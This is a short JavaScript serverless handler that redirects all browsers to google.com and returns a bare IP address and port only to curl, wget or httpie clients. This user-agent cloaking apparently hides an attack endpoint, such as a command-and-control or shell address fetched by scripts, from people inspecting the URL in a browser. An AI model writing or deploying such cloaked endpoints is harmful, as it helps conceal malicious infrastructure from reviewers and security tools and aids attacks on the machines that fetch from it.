export default function handler(req, res) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const accept = (req.headers['accept'] || '').toLowerCase();

  // Detect common browsers
  const isBrowser =
    ua.includes('mozilla') ||
    ua.includes('chrome') ||
    ua.includes('safari') ||
    ua.includes('firefox') ||
    ua.includes('edg');

  // Detect curl / CLI tools
  const isCli =
    ua.includes('curl') ||
    ua.includes('wget') ||
    ua.includes('httpie');

  // Extra check (browsers usually send richer Accept headers)
  const looksLikeBrowserAccept =
    accept.includes('text/html') || accept.includes('application/xhtml');

  // Block browsers hard
  if (isBrowser || looksLikeBrowserAccept || !isCli) {
    res.writeHead(302, {
      Location: 'https://www.google.com',
    });
    return res.end();
  }

  // Raw output
  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send('84.84.38.102:8548');
}